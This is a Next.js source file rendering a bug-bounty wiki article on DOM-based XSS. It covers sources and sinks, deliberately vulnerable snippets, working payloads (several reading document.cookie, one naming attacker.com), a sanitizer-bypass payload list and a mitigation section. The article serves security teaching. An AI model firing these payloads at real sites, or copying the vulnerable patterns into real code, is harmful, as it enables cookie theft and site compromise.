/**
 * XSS DOM-BASED
 * XSS that lives only in the browser's DOM
 */

import { ReactNode } from 'react';
import {
  Section,
  Subsection,
  Paragraph,
  Strong,
  InlineCode,
  AlertInfo,
  AlertWarning,
  AlertDanger,
  AlertTip,
  CodeBlock,
  TerminalOutput,
  HighlightBox,
  ListItem
} from '@/components/WikiArticleComponents';
import { Code, Shield, Zap, AlertTriangle, ArrowRight } from 'lucide-react';
import Link from 'next/link';

interface ArticleContentProps {
  locale: string;
}

export default function XSSDOMBasedContentEN({ locale }: ArticleContentProps): ReactNode {
  return (
    <>
      <Section id="introduction" title="DOM-Based XSS - Serverless XSS">
        <Paragraph>
          <Strong>DOM-Based XSS</Strong> is XSS where the payload NEVER touches the server. 
          The vulnerable JavaScript processes input directly in the browser using 
          <InlineCode>location.hash</InlineCode>, <InlineCode>document.URL</InlineCode>, 
          or <InlineCode>window.name</InlineCode>.
        </Paragraph>

        <AlertDanger title="Why It's Dangerous">
          <ul className="mt-2 space-y-1">
            <ListItem>🔍 WAF/IDS doesn't detect it (never reaches server)</ListItem>
            <ListItem>📝 Doesn't appear in server logs</ListItem>
            <ListItem>🎯 CSP bypass if unsafe-eval present</ListItem>
            <ListItem>🚪 Evades server-side filters</ListItem>
            <ListItem>⚡ Executes instantly (no page reload)</ListItem>
          </ul>
        </AlertDanger>
      </Section>

      <Section id="sinks-sources" title="1. Sources and Sinks - DOM XSS Anatomy">
        <Paragraph>
          DOM XSS occurs when data from a <Strong>Source</Strong> (controllable input) 
          flows to a <Strong>Sink</Strong> (dangerous function) without sanitization.
        </Paragraph>

        <Subsection title="Attacker-Controllable Sources">
          <HighlightBox color="red">
            <Strong>Common sources:</Strong>
            <ul className="mt-2 space-y-1">
              <ListItem><InlineCode>location.hash</InlineCode> - URL fragment (#payload)</ListItem>
              <ListItem><InlineCode>location.search</InlineCode> - Query params (?q=payload)</ListItem>
              <ListItem><InlineCode>document.URL</InlineCode> - Complete URL</ListItem>
              <ListItem><InlineCode>document.referrer</InlineCode> - Referer header</ListItem>
              <ListItem><InlineCode>window.name</InlineCode> - Window name</ListItem>
              <ListItem><InlineCode>postMessage</InlineCode> - Cross-window messages</ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <Subsection title="Dangerous Sinks">
          <CodeBlock
            language="javascript"
            title="Critical sinks that execute code"
            code={`// 🔥 DIRECT EXECUTION SINKS
eval(userInput)
setTimeout(userInput, 100)
setInterval(userInput, 100)
Function(userInput)
execScript(userInput)  // IE legacy

// 🎯 HTML INJECTION SINKS
element.innerHTML = userInput
element.outerHTML = userInput
document.write(userInput)
document.writeln(userInput)

// ⚙️ DOM MANIPULATION SINKS
element.insertAdjacentHTML('beforeend', userInput)
element.setAttribute('onclick', userInput)

// 🚪 NAVIGATION SINKS
location = userInput
location.href = userInput
location.assign(userInput)
window.open(userInput)

// 📜 SCRIPT LOADING SINKS
script.src = userInput
script.text = userInput`}
          />
        </Subsection>
      </Section>

      <Section id="location-hash" title="2. DOM XSS via location.hash">
        <CodeBlock
          language="html"
          title="❌ VULNERABLE - innerHTML with location.hash"
          code={`<!DOCTYPE html>
<html>
<head>
  <title>Vulnerable App</title>
</head>
<body>
  <h1>Welcome Page</h1>
  <div id="content"></div>
  
  <script>
    // ❌ VULNERABLE - Takes hash and renders without sanitization
    const fragment = location.hash.substring(1);  // Remove #
    
    document.getElementById('content').innerHTML = fragment;
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="text"
          title="XSS payload in URL fragment"
          code={`https://victim.com/page.html#<img src=x onerror=alert(document.cookie)>

# How it works:
1. location.hash === "#<img src=x onerror=alert(document.cookie)>"
2. fragment === "<img src=x onerror=alert(document.cookie)>"
3. innerHTML executes the onerror handler
4. ✅ XSS executed WITHOUT touching server`}
        />

        <TerminalOutput title="Request in Network tab">
          {`GET /page.html HTTP/1.1
Host: victim.com

# ⚠️ Note: The #payload is NOT sent to the server!
# It only exists in the browser
# WAF/IDS never sees it`}
        </TerminalOutput>
      </Section>

      <Section id="document-url" title="3. DOM XSS via document.URL">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Extract parameter from URL"
          code={`// Common function to get query params
function getParameterByName(name) {
  const url = document.URL;  // ← Source
  
  const regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)');
  const results = regex.exec(url);
  
  if (!results) return null;
  if (!results[2]) return '';
  
  return decodeURIComponent(results[2].replace(/\\+/g, ' '));
}

// Vulnerable usage
const userName = getParameterByName('name');
document.getElementById('welcome').innerHTML = 'Hello ' + userName;  // ← Sink`}
        />

        <CodeBlock
          language="text"
          title="Payload - XSS via query parameter"
          code={`https://victim.com/profile?name=<img src=x onerror=alert(1)>

# Alternative with encoded payload
https://victim.com/profile?name=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E`}
        />
      </Section>

      <Section id="eval-sink" title="4. DOM XSS via eval()">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - eval() with user input"
          code={`// Vulnerable analytics tracker
window.addEventListener('hashchange', function() {
  const action = location.hash.substring(1);
  
  // ❌ VULNERABLE - eval() is direct code execution
  eval('trackEvent("' + action + '")');
});`}
        />

        <CodeBlock
          language="text"
          title="Payload - RCE via eval()"
          code={`https://victim.com/analytics#");alert(document.cookie);//

# Executed code:
eval('trackEvent(""); alert(document.cookie); //")');

# Result: Cookie leaked`}
        />

        <AlertWarning>
          <InlineCode>eval()</InlineCode> is extremely dangerous. Use <InlineCode>JSON.parse()</InlineCode> 
          for data, never eval().
        </AlertWarning>
      </Section>

      <Section id="window-name" title="5. DOM XSS via window.name">
        <Paragraph>
          <InlineCode>window.name</InlineCode> persists between navigations in the same tab. 
          An attacker can pre-set a malicious value.
        </Paragraph>

        <CodeBlock
          language="html"
          title="❌ VULNERABLE - Reading window.name"
          code={`<!DOCTYPE html>
<html>
<body>
  <h1>Dashboard</h1>
  <div id="user-panel"></div>
  
  <script>
    // ❌ VULNERABLE - Trusting window.name
    if (window.name) {
      const userData = window.name;
      document.getElementById('user-panel').innerHTML = userData;
    }
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="html"
          title="Attack - Pre-set malicious window.name"
          code={`<!-- Attacker's page -->
<!DOCTYPE html>
<html>
<body>
  <script>
    // 1. Set window.name with payload
    window.name = '<img src=x onerror=alert(document.domain)>';
    
    // 2. Redirect to vulnerable page
    location = 'https://victim.com/dashboard';
    
    // 3. window.name PERSISTS in navigation
    // 4. victim.com reads window.name and executes XSS
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="postmessage-xss" title="6. DOM XSS via postMessage">
        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - postMessage without validation"
          code={`// Vulnerable page listens to messages
window.addEventListener('message', function(event) {
  // ❌ VULNERABLE - Not verifying event.origin
  // ❌ VULNERABLE - Not sanitizing event.data
  
  const message = event.data;
  document.getElementById('notification').innerHTML = message;
});`}
        />

        <CodeBlock
          language="html"
          title="Payload - XSS via iframe postMessage"
          code={`<!-- Attacker page -->
<!DOCTYPE html>
<html>
<body>
  <iframe id="victim" src="https://victim.com/notifications"></iframe>
  
  <script>
    window.onload = function() {
      const victimWindow = document.getElementById('victim').contentWindow;
      
      // Send XSS payload
      const payload = '<img src=x onerror=alert(document.cookie)>';
      
      victimWindow.postMessage(payload, '*');
    };
  </script>
</body>
</html>`}
        />
      </Section>

      <Section id="angular-bypass" title="7. AngularJS Template Injection">
        <CodeBlock
          language="html"
          title="❌ VULNERABLE - AngularJS 1.x with ng-bind-html"
          code={`<!-- Vulnerable app -->
<!DOCTYPE html>
<html ng-app>
<head>
  <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
</head>
<body>
  <div ng-controller="SearchController">
    <h1>Search Results for: <span ng-bind-html="searchQuery"></span></h1>
  </div>
  
  <script>
    function SearchController($scope, $location) {
      // ❌ VULNERABLE - Takes query from URL without sanitization
      $scope.searchQuery = $location.search().q;
    }
  </script>
</body>
</html>`}
        />

        <CodeBlock
          language="text"
          title="Payload - Angular template injection"
          code={`https://victim.com/search?q={{constructor.constructor('alert(1)')()}}

# Alternative with $eval:
?q={{$eval.constructor('alert(document.cookie)')()}}

# Payload for AngularJS 1.6+:
?q={{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor)}}`}
        />
      </Section>

      <Section id="dom-clobbering" title="8. DOM Clobbering">
        <Paragraph>
          <Strong>DOM Clobbering</Strong> abuses HTML to overwrite global properties 
          and cause XSS in code that assumes certain variables are defined.
        </Paragraph>

        <CodeBlock
          language="javascript"
          title="❌ VULNERABLE - Code that assumes window.config exists"
          code={`// Vulnerable code using window.config
if (window.config && window.config.apiUrl) {
  fetch(window.config.apiUrl + '/data')
    .then(response => response.json())
    .then(data => {
      // Process data
    });
}`}
        />

        <CodeBlock
          language="html"
          title="Payload - Clobbering window.config"
          code={`<!-- Attacker injects HTML (comment, profile bio, etc.) -->
<a id="config" href="https://attacker.com/evil">
  <a id="config" name="apiUrl" href="javascript:alert(document.cookie)">
</a>

<!-- Result:
window.config.apiUrl === "javascript:alert(document.cookie)"

fetch() executes javascript: protocol → XSS
-->`}
        />
      </Section>

      <Section id="tools" title="9. Detection Tools">
        <Subsection title="DOM Invader (Burp Suite)">
          <AlertTip>
            <Strong>DOM Invader</Strong> is a Burp extension that automatically detects DOM XSS:
            <ul className="mt-2 space-y-1">
              <ListItem>Instruments sources (location.hash, etc.)</ListItem>
              <ListItem>Colors dangerous sinks in DevTools</ListItem>
              <ListItem>Generates PoCs automatically</ListItem>
              <ListItem>Detects DOM clobbering</ListItem>
            </ul>
          </AlertTip>

          <CodeBlock
            language="text"
            title="Using DOM Invader"
            code={`1. Install Burp Suite Professional
2. Open Burp Browser
3. DOM Invader activates automatically
4. Visit vulnerable page
5. Enter canary string in inputs: "testpayload123"
6. DOM Invader alerts if canary reaches dangerous sink
7. Generate automatic PoC in Burp panel`}
          />
        </Subsection>

        <Subsection title="DOMPurify Testing">
          <CodeBlock
            language="bash"
            title="Common payloads to bypass sanitizers"
            code={`# Common payloads to bypass DOMPurify
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>
<iframe src=javascript:alert(1)>
<math><mi//xlink:href="data:x,<script>alert(1)</script>">

# mXSS (mutation XSS):
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

# Template literal injection:
\${alert(document.domain)}`}
          />
        </Subsection>
      </Section>

      <Section id="mitigation" title="Complete Mitigation">
        <AlertDanger title="✅ Prevent DOM-Based XSS">
          Apply ALL of these protections.
        </AlertDanger>

        <Subsection title="1. Use textContent instead of innerHTML">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - textContent doesn't execute HTML"
            code={`// ❌ VULNERABLE
const name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Hello ' + name;

// ✅ SECURE - textContent auto-escapes
const name = location.hash.substring(1);
document.getElementById('welcome').textContent = 'Hello ' + name;

// Alternative: createTextNode
const textNode = document.createTextNode('Hello ' + name);
document.getElementById('welcome').appendChild(textNode);`}
          />
        </Subsection>

        <Subsection title="2. Sanitize with DOMPurify">
          <CodeBlock
            language="html"
            title="✅ SECURE - DOMPurify sanitizes HTML"
            code={`<!DOCTYPE html>
<html>
<head>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/3.0.6/purify.min.js"></script>
</head>
<body>
  <div id="content"></div>
  
  <script>
    const userInput = location.hash.substring(1);
    
    // ✅ SECURE - DOMPurify removes payloads
    const clean = DOMPurify.sanitize(userInput);
    
    document.getElementById('content').innerHTML = clean;
    
    // Payload: <img src=x onerror=alert(1)>
    // Result: <img src="x">  (onerror removed)
  </script>
</body>
</html>`}
          />
        </Subsection>

        <Subsection title="3. Validate event.origin in postMessage">
          <CodeBlock
            language="javascript"
            title="✅ SECURE - Verify message origin"
            code={`window.addEventListener('message', function(event) {
  // ✅ Verify origin
  const allowedOrigins = ['https://trusted.com', 'https://app.trusted.com'];
  
  if (!allowedOrigins.includes(event.origin)) {
    console.error('Unauthorized origin:', event.origin);
    return;
  }
  
  // ✅ Validate data structure
  if (typeof event.data !== 'object' || !event.data.type) {
    return;
  }
  
  // ✅ Sanitize before using
  const sanitized = DOMPurify.sanitize(event.data.message);
  
  document.getElementById('notification').textContent = sanitized;
});`}
          />
        </Subsection>

        <Subsection title="4. CSP with unsafe-inline blocked">
          <CodeBlock
            language="text"
            title="✅ SECURE - Strict CSP"
            code={`Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' 'nonce-{random}'; 
  object-src 'none';
  base-uri 'none';

# Blocks:
# - 'unsafe-inline' (prevents innerHTML XSS)
# - 'unsafe-eval' (prevents eval() XSS)
# - javascript: URIs`}
          />
        </Subsection>

        <Subsection title="5. Avoid Dangerous Sinks">
          <HighlightBox color="green">
            <Strong>Secure replacements:</Strong>
            <ul className="mt-2 space-y-1">
              <ListItem>❌ <InlineCode>eval(code)</InlineCode> → ✅ <InlineCode>JSON.parse(data)</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>setTimeout(code, 100)</InlineCode> → ✅ <InlineCode>setTimeout(function, 100)</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>innerHTML</InlineCode> → ✅ <InlineCode>textContent</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>location = url</InlineCode> → ✅ <InlineCode>location.href = sanitize(url)</InlineCode></ListItem>
              <ListItem>❌ <InlineCode>document.write()</InlineCode> → ✅ <InlineCode>appendChild()</InlineCode></ListItem>
            </ul>
          </HighlightBox>
        </Subsection>

        <Subsection title="6. Use Framework with Auto-escaping">
          <CodeBlock
            language="jsx"
            title="✅ SECURE - React auto-escapes"
            code={`import React, { useEffect, useState } from 'react';

function Dashboard() {
  const [name, setName] = useState('');
  
  useEffect(() => {
    // Read from URL hash
    const hashName = window.location.hash.substring(1);
    setName(hashName);
  }, []);
  
  return (
    <div>
      {/* ✅ SECURE - React auto-escapes */}
      <h1>Hello {name}</h1>
      
      {/* ❌ DANGEROUS - dangerouslySetInnerHTML disables escaping */}
      {/* <div dangerouslySetInnerHTML={{__html: name}} /> */}
    </div>
  );
}`}
          />
        </Subsection>
      </Section>

      <div className="mt-12 pt-8 border-t border-slate-200 dark:border-slate-800">
        <h3 className="text-2xl font-bold text-slate-900 dark:text-white mb-4">Next: CSP Bypass</h3>
        <Link
          href={`/${locale}/wiki/bug-bounty/csp-bypass`}
          className="group inline-flex items-center gap-3 px-6 py-4 bg-gradient-to-r from-orange-600 to-red-600 text-white rounded-xl font-semibold hover:shadow-xl hover:shadow-orange-500/50 transition-all"
        >
          <span>Bypassing Content Security Policy</span>
          <ArrowRight className="w-5 h-5 group-hover:translate-x-1 transition-transform" />
        </Link>
      </div>
    </>
  );
}
